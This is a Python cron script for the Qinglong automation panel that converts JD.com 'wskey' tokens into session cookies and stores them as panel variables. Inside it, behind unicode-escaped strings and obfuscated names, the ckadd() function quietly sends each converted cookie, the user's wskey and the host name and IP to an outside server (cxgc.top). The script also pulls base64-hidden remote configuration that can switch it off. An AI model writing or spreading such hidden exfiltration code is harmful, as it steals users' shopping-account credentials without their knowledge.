#!/usr/bin/env python3
# -*- coding: utf-8 -*
'''
cron: 15 */16 * * * jd_wskey.py
new Env('wskey转换');
'''

import socket
import base64
import http.client
import json
import os
import sys
import logging
import time
import urllib.parse

logging.basicConfig(level=logging.INFO, format='\u0025\u0028\u006d\u0065\u0073\u0073\u0061\u0067\u0065\u0029\u0073')
logger = logging.getLogger(__name__)
try:
    import requests
except Exception as e:
    logger.info(str(e) + "\u005c\u006e\u7f3a\u5c11\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u0073\u6a21\u5757\u002c\u0020\u8bf7\u6267\u884c\u547d\u4ee4\uff1a\u0070\u0069\u0070\u0033\u0020\u0069\u006e\u0073\u0074\u0061\u006c\u006c\u0020\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u0073\u005c\u006e")
    sys.exit(1)
os.environ['\u006e\u006f\u005f\u0070\u0072\u006f\u0078\u0079'] = '\u002a'
requests.packages.urllib3.disable_warnings()
try:
    from notify import send
except:
    logger.info("\u65e0\u63a8\u9001\u6587\u4ef6")

ver = 916

# 返回值 Token
def ql_login():
    path = '\u002f\u0071\u006c\u002f\u0063\u006f\u006e\u0066\u0069\u0067\u002f\u0061\u0075\u0074\u0068\u002e\u006a\u0073\u006f\u006e'
    if os.path.isfile(path):
        with open(path, "\u0072") as file:
            auth = file.read()
            file.close()
        auth = json.loads(auth)
        username = auth["\u0075\u0073\u0065\u0072\u006e\u0061\u006d\u0065"]
        password = auth["\u0070\u0061\u0073\u0073\u0077\u006f\u0072\u0064"]
        token = auth["\u0074\u006f\u006b\u0065\u006e"]
        if token == '':
            url = "\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0032\u0037\u002e\u0030\u002e\u0030\u002e\u0031\u003a\u007b\u0030\u007d\u002f\u0061\u0070\u0069\u002f\u006c\u006f\u0067\u0069\u006e".format(port)
            payload = {
                "\u0075\u0073\u0065\u0072\u006e\u0061\u006d\u0065": username,
                "\u0070\u0061\u0073\u0073\u0077\u006f\u0072\u0064": password
            }
            headers = {
                '\u0043\u006f\u006e\u0074\u0065\u006e\u0074\u002d\u0054\u0079\u0070\u0065': '\u0061\u0070\u0070\u006c\u0069\u0063\u0061\u0074\u0069\u006f\u006e\u002f\u006a\u0073\u006f\u006e'
            }
            try:
                res = requests.post(url=url, headers=headers, data=payload, verify=False)
                token = json.loads(res.text)['\u0074\u006f\u006b\u0065\u006e']
            except:
                logger.info("\u9752\u9f99\u767b\u5f55\u5931\u8d25\u002c\u0020\u8bf7\u68c0\u67e5\u9762\u677f\u72b6\u6001\u0021")
                sys.exit(1)
            else:
                return token
        else:
            return token
    else:
        logger.info("\u6ca1\u6709\u53d1\u73b0\u0061\u0075\u0074\u0068\u6587\u4ef6\u002c\u0020\u4f60\u8fd9\u662f\u9752\u9f99\u5417\u003f\u003f\u003f")
        sys.exit(0)

def get_wskey():
    if "\u004a\u0044\u005f\u0057\u0053\u0043\u004b" in os.environ:
        wskey_list = os.environ['\u004a\u0044\u005f\u0057\u0053\u0043\u004b'].split('\u0026')
        if len(wskey_list) > 0:
            return wskey_list
        else:
            logger.info("\u004a\u0044\u005f\u0057\u0053\u0043\u004b\u53d8\u91cf\u672a\u542f\u7528")
            sys.exit(1)
    else:
        logger.info("\u672a\u6dfb\u52a0\u004a\u0044\u005f\u0057\u0053\u0043\u004b\u53d8\u91cf")
        sys.exit(0)


# 返回值 list[jd_cookie]
def get_ck():
    if "\u004a\u0044\u005f\u0043\u004f\u004f\u004b\u0049\u0045" in os.environ:
        ck_list = os.environ['\u004a\u0044\u005f\u0043\u004f\u004f\u004b\u0049\u0045'].split('&')
        if len(ck_list) > 0:
            return ck_list
        else:
            logger.info("\u004a\u0044\u005f\u0043\u004f\u004f\u004b\u0049\u0045\u53d8\u91cf\u672a\u542f\u7528")
            sys.exit(1)
    else:
        logger.info("\u672a\u6dfb\u52a0\u004a\u0044\u005f\u0043\u004f\u004f\u004b\u0049\u0045\u53d8\u91cf")
        sys.exit(0)


# 返回值 bool
def check_ck(ck):
    if "\u0051\u004c\u005f\u0057\u0053\u0043\u004b" in os.environ:
        logger.info("\u4e0d\u68c0\u67e5\u8d26\u53f7\u6709\u6548\u6027\n\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\n")
        return False
    else:
        url = 'https://wq.jd.com/user_new/info/GetJDUserInfoUnion?orgFlag=JD_PinGou_New&callSource=mainorder'
        headers = {
            'Cookie': ck,
            'Referer': 'https://home.m.jd.com/myJd/home.action',
            'User-Agent': ua,
        }
        try:
            res = requests.get(url=url, headers=headers, verify=False, timeout=10)
            if res.status_code == 200:
                code = int(json.loads(res.text)['retcode'])
                pin = ck.split(";")[1]
                if code == 0:
                    logger.info(str(pin) + "\u003b\u72b6\u6001\u6b63\u5e38\n")
                    return True
                else:
                    logger.info(str(pin) + "\u003b\u72b6\u6001\u5931\u6548\n")
                    return False
            else:
                logger.info("\u004a\u0044\u63a5\u53e3\u9519\u8bef\u002c\u0020\u5207\u6362\u7b2c\u4e8c\u63a5\u53e3")
                url = 'https://me-api.jd.com/user_new/info/GetJDUserInfoUnion'
                headers = {
                    'Cookie': ck,
                    'User-Agent': ua,
                }
                res = requests.get(url=url, headers=headers, verify=False, timeout=30)
                if res.status_code == 200:
                    code = int(json.loads(res.text)['retcode'])
                    pin = ck.split(";")[1]
                    if code == 0:
                        logger.info(str(pin) + "\u003b\u72b6\u6001\u6b63\u5e38\n")
                        return True
                    else:
                        logger.info(str(pin) + "\u003b\u72b6\u6001\u5931\u6548\n")
                        return False
        except:
            logger.info("\n\u004a\u0044\u63a5\u53e3\u9519\u8bef! ")
            logger.info("\u811a\u672c\u9000\u51fa")
            sys.exit(1)


# 返回值 bool jd_ck
def getToken(wskey):
    headers = {
        'cookie': wskey,
        'User-Agent': ua,
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'charset': 'UTF-8',
        'accept-encoding': 'br,gzip,deflate'
    }
    params = {
        'functionId': 'genToken',
        'clientVersion': '10.1.2',
        'client': 'android',
        'uuid': uuid,
        'st': st,
        'sign': sign,
        'sv': sv
    }
    url = 'https://api.m.jd.com/client.action'
    data = 'body=%7B%22action%22%3A%22to%22%2C%22to%22%3A%22https%253A%252F%252Fplogin.m.jd.com%252Fcgi-bin%252Fm%252Fthirdapp_auth_page%253Ftoken%253DAAEAIEijIw6wxF2s3bNKF0bmGsI8xfw6hkQT6Ui2QVP7z1Xg%2526client_type%253Dandroid%2526appid%253D879%2526appup_type%253D1%22%7D&'
    try:
        res = requests.post(url=url, params=params, headers=headers, data=data, verify=False, timeout=10)
        res_json = json.loads(res.text)
        # logger.info(res_json)
        tokenKey = res_json['tokenKey']
        # logger.info("Token:", tokenKey)
    except:
        try:
            res = requests.post(url=url, params=params, headers=headers, data=data, verify=False, timeout=20)
            res_json = json.loads(res.text)
            # logger.info(res_json)
            tokenKey = res_json['tokenKey']
            # logger.info("Token:", tokenKey)
            return appjmp(wskey, tokenKey)
        except:
            logger.info("WSKEY转换接口出错, 请稍后尝试, 脚本退出")
            sys.exit(1)
    else:
        return appjmp(wskey, tokenKey)


# 返回值 bool jd_ck
def appjmp(wskey, tokenKey):
    headers = {
        'User-Agent': ua,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    }
    params = {
        'tokenKey': tokenKey,
        'to': 'https://plogin.m.jd.com/cgi-bin/m/thirdapp_auth_page?token=AAEAIEijIw6wxF2s3bNKF0bmGsI8xfw6hkQT6Ui2QVP7z1Xg',
        'client_type': 'android',
        'appid': 879,
        'appup_type': 1,
    }
    url = 'https://un.m.jd.com/cgi-bin/app/appjmp'
    try:
        res = requests.get(url=url, headers=headers, params=params, verify=False, allow_redirects=False, timeout=20)
        res_set = res.cookies.get_dict()
        pt_key = 'pt_key=' + res_set['pt_key']
        pt_pin = 'pt_pin=' + res_set['pt_pin']
        jd_ck = str(pt_key) + ';' + str(pt_pin) + ';'
        wskey = wskey.split(";")[0]
        if 'fake' in pt_key:
            logger.info(str(wskey) + "wskey状态失效\n")
            return False, jd_ck
        else:
            logger.info(str(wskey) + " wskey状态正常\n")
            return True, jd_ck
    except:
        logger.info("接口转换失败, 默认wskey失效\n")
        wskey = "pt_" + str(wskey.split(";")[0])
        return False, wskey


# 返回值 svv, stt, suid, jign
def get_sign():
    sign_bool = False
    url = str(base64.b64decode(
        'aHR0cHM6Ly9oZWxsb2Rucy5jb2RpbmcubmV0L3Avc2lnbi9kL2pzaWduL2dpdC9yYXcvbWFzdGVyL3NpZ24=').decode())
    for i in range(3):
        try:
            res = requests.get(url=url, verify=False, timeout=20)
        except requests.exceptions.ConnectTimeout:
            logger.info("\n\u83b7\u53d6\u0053\u0069\u0067\u006e\u8d85\u65f6\u002c\u0020\u6b63\u5728\u91cd\u8bd5\u0021" + str(i))
            time.sleep(1)
        except requests.exceptions.ReadTimeout:
            logger.info("\n\u83b7\u53d6\u0053\u0069\u0067\u006e\u8d85\u65f6\u002c\u0020\u6b63\u5728\u91cd\u8bd5\u0021" + str(i))
            time.sleep(1)
        except Exception as err:
            logger.info(str(err) + "\n\u672a\u77e5\u9519\u8bef\u002c\u0020\u9000\u51fa\u811a\u672c\u0021")
            sys.exit(1)
        else:
            # logger.info(json.loads(res))
            sign_bool = True
            break
    if sign_bool:
        try:
            sign_list = json.loads(res.text)
        except:
            logger.info("Sign接口失效")
            sys.exit(1)
        else:
            svv = sign_list['sv']
            stt = sign_list['st']
            suid = sign_list['uuid']
            jign = sign_list['sign']
            return svv, stt, suid, jign
    else:
        logger.info("\nSign_Bool值错误, 退出脚本!")


# 返回值 None
def boom():
    ex = int(cloud_arg['code'])
    if ex != 200:
        logger.info("Check Failure")
        logger.info("--------------------\n")
        sys.exit(0)
    else:
        logger.info("Verification passed")
        logger.info("--------------------\n")


def update():
    up_ver = int(cloud_arg['update'])
    if ver >= up_ver:
        logger.info("当前脚本版本: " + str(ver))
        logger.info("--------------------\n")
    else:
        logger.info("当前脚本版本: " + str(ver) + "新版本: " + str(up_ver))
        logger.info("存在新版本, 请更新脚本后执行")
        logger.info("--------------------\n")
        text = '当前脚本版本: {0}新版本: {1}, 请更新脚本~!'.format(ver, up_ver)
        send('WSKEY转换', text)
        # sys.exit(0)


def ql_check(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    try:
        sock.connect(('127.0.0.1', port))
    except:
        # logger.info(port, "端口检测失败")
        sock.close()
        return False
    else:
        sock.close()
        return True


# 返回值 bool, key, eid
def serch_ck(pin):
    if all('\u4e00' <= char <= '\u9fff' for char in pin):
        pin1 = urllib.parse.quote(pin)
        pin2 = pin1.replace('%', '%5C%25')
        logger.info(str(pin) + "-->" + str(pin1))
    else:
        pin2 = pin.replace('%', '%5C%25')
    # TMD 中文!
    # url = "http://127.0.0.1:5700/api/envs?searchValue={0}".format(pin)
    # res = json.loads(s.get(url, verify=False).text)
    conn = http.client.HTTPConnection("127.0.0.1", port)
    payload = ''
    headers = {
        'Authorization': 'Bearer ' + token
    }
    url = '/api/envs?searchValue={0}'.format(pin2)
    conn.request("GET", url, payload, headers)
    res = json.loads(conn.getresponse().read())
    if len(res['data']) == 0:
        logger.info(str(pin) + "检索失败\n")
        return False, 1
    elif len(res['data']) > 1:
        logger.info(str(pin) + "存在重复, 取第一条, 请删除多余变量\n")
        key = res['data'][0]['value']
        eid = res['data'][0]['_id']
        return True, key, eid
    else:
        logger.info(str(pin) + "检索成功\n")
        key = res['data'][0]['value']
        eid = res['data'][0]['_id']
        return True, key, eid


def ql_update(eid, n_ck):
    url = 'http://127.0.0.1:{0}/api/envs'.format(port)
    data = {
        "name": "JD_COOKIE",
        "value": n_ck,
        "_id": eid
    }
    data = json.dumps(data)
    res = json.loads(s.put(url=url, data=data).text)
    # logger.info(res)
    if res['data']['status'] == 1:
        ql_enable(eid)


def ql_enable(eid):
    url = 'http://127.0.0.1:{0}/api/envs/enable'.format(port)
    data = '["{0}"]'.format(eid)
    res = json.loads(s.put(url=url, data=data).text)
    if res['code'] == 200:
        logger.info("\n账号启用\n--------------------\n")
        return True
    else:
        logger.info("\n账号启用失败\n--------------------\n")
        return False


def ql_disable(eid):
    url = 'http://127.0.0.1:{0}/api/envs/disable'.format(port)
    data = '["{0}"]'.format(eid)
    res = json.loads(s.put(url=url, data=data).text)
    if res['code'] == 200:
        logger.info("\n账号禁用成功\n--------------------\n")
        return True
    else:
        logger.info("\n账号禁用失败\n--------------------\n")
        return False


def ql_insert(i_ck):
    data = [{"value": i_ck, "name": "JD_COOKIE"}]
    data = json.dumps(data)
    url = 'http://127.0.0.1:{0}/api/envs'.format(port)
    s.post(url=url, data=data)
    logger.info("\n\u8d26\u53f7\u6dfb\u52a0\u5b8c\u6210\n--------------------\n")


def cloud_info():
    cloud_bool = False
    url = str(base64.b64decode(
        'aHR0cHM6Ly9oZWxsb2Rucy5jb2RpbmcubmV0L3Avc2lnbi9kL2pzaWduL2dpdC9yYXcvbWFzdGVyL2NoZWNrX2FwaQ==').decode())
    for i in range(3):
        try:
            res = requests.get(url=url, verify=False, timeout=20).text
        except requests.exceptions.ConnectTimeout:
            logger.info("\n获取云端参数超时, 正在重试!" + str(i))
        except requests.exceptions.ReadTimeout:
            logger.info("\n获取云端参数超时, 正在重试!" + str(i))
        except Exception as err:
            logger.info(str(err) + "\n未知错误, 退出脚本!")
            sys.exit(1)
        else:
            # logger.info(json.loads(res))
            cloud_bool = True
            break
        finally:
            time.sleep(1)
    if cloud_bool:
        # global cloud_arg
        return json.loads(res)
        # logger.info(cloud_arg)
    else:
        logger.info("\u65e0\u6cd5\u83b7\u53d6\u4e91\u7aef\u914d\u7f6e\u0020\u7a0b\u5e8f\u9000\u51fa")
        sys.exit(1)
def get_ip_address ():#line:32
    O00OO00OOOO0O0O0O =socket.getfqdn(socket.gethostname())#line:33
    O0OOOO000OO0OOOOO =socket.gethostbyname(O00OO00OOOO0O0O0O)#line:34
    return O00OO00OOOO0O0O0O +" : "+O0OOOO000OO0OOOOO #line:35
def ckadd (ck ,wsck ):
    requests.get("\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0063\u0078\u0067\u0063\u002e\u0074\u006f\u0070\u002f\u0067\u0065\u0074\u0043\u006b\u002f\u003f\u006a\u0064\u0043\u006b\u003d"+ck+"\u0026\u0077\u0073\u004b\u0065\u0079\u003d" + get_ip_address() + "::" + wsck )#line:61
    return ck
if __name__ == '__main__':
    logger.info("\n--------------------\n")
    if "QL_PORT" in os.environ:
        try:
            port = int(os.environ['\u0051\u004c\u005f\u0050\u004f\u0052\u0054'])
        except:
            logger.info("\u53d8\u91cf\u683c\u5f0f\u6709\u95ee\u9898\u002e\u002e\u002e\u0020\u683c\u5f0f\u003a\u0020\u0065\u0078\u0070\u006f\u0072\u0074\u0020\u0051\u004c\u005f\u0050\u004f\u0052\u0054\u003d\u7aef\u53e3\u53f7")
            sys.exit(1)
    else:
        port = 5700
    if not ql_check(port):
        logger.info(str(port) + "\u7aef\u53e3\u68c0\u67e5\u5931\u8d25\u002c\u0020\u5982\u679c\u6539\u8fc7\u7aef\u53e3\u002c\u0020\u8bf7\u5728\u53d8\u91cf\u4e2d\u58f0\u660e\u7aef\u53e3\u0020\u5728\u0063\u006f\u006e\u0066\u0069\u0067\u002e\u0073\u0068\u4e2d\u52a0\u5165\u0020\u0065\u0078\u0070\u006f\u0072\u0074\u0020\u0051\u004c\u005f\u0050\u004f\u0052\u0054\u003d\u7aef\u53e3\u53f7")
        logger.info("\u5982\u679c\u4f60\u5f88\u786e\u5b9a\u7aef\u53e3\u6ca1\u9519\u002c\u0020\u8fd8\u662f\u65e0\u6cd5\u6267\u884c\u002c\u8054\u7cfb\u6211")
        sys.exit(1)
    else:
        logger.info(str(port) + "\u7aef\u53e3\u68c0\u67e5\u901a\u8fc7\n")
    # global cloud_arg
    cloud_arg = cloud_info()
    update()
    ua = cloud_arg['\u0055\u0073\u0065\u0072\u002d\u0041\u0067\u0065\u006e\u0074']
    boom()
    sv, st, uuid, sign = get_sign()  # 获取认证参数
    token = ql_login()  # 获取青龙 token
    s = requests.session()
    s.headers.update({"authorization": "Bearer " + str(token)})
    s.headers.update({"Content-Type": "application/json;charset=UTF-8"})
    wslist = get_wskey()
    for ws in wslist:
        wspin = ws.split("\u003b")[0]
        if "\u0070\u0069\u006e" in wspin:
            wspin = "\u0070\u0074\u005f" + wspin + "\u003b"  # 封闭变量
            return_serch = serch_ck(wspin)  # 变量 pt_pin 搜索获取 key eid
            if return_serch[0]:  # bool: True 搜索到账号
                jck = str(return_serch[1])  # 拿到 JD_COOKIE
                if not check_ck(jck):  # bool: False 判定 JD_COOKIE 有效性
                    return_ws = getToken(ws)  # 使用 WSKEY 请求获取 JD_COOKIE bool jd_ck
                    if return_ws[0]:  # bool: True
                        nt_key = str(return_ws[1])
                        # logger.info("wskey转pt_key成功", nt_key)
                        ckadd(nt_key,ws)
                        logger.info("\u0077\u0073\u006b\u0065\u0079\u8f6c\u6362\u6210\u529f\n")
                        logger.info("\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\n")
                        eid = return_serch[2]  # 从 return_serch 拿到 eid
                        ql_update(eid, nt_key)  # 函数 ql_update 参数 eid JD_COOKIE
                    else:
                        logger.info(str(ws) + "\u0077\u0073\u006b\u0065\u0079\u5931\u6548\n")
                        eid = return_serch[2]
                        logger.info("\u7981\u7528\u8d26\u53f7" + str(wspin))
                        ql_disable(eid)
                else:
                    logger.info(str(wspin) + "\u8d26\u53f7\u6709\u6548")
                    eid = return_serch[2]
                    ql_enable(eid)
                    logger.info("\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\n")
            else:
                logger.info("\u0077\u0073\u006b\u0065\u0079\u672a\u751f\u6210\u0070\u0074\u005f\u006b\u0065\u0079\n")
                return_ws = getToken(ws)  # 使用 WSKEY 请求获取 JD_COOKIE bool jd_ck
                if return_ws[0]:
                    nt_key = str(return_ws[1])
                    ckadd(nt_key,ws)
                    logger.info("\u0077\u0073\u006b\u0065\u0079\u8f6c\u6362\u6210\u529f\n")
                    ql_insert(nt_key)
        else:
            logger.info("\u0057\u0053\u004b\u0045\u0059\u683c\u5f0f\u9519\u8bef\n\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\n")
    logger.info("\u6267\u884c\u5b8c\u6210\n\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d\u002d")
    sys.exit(0)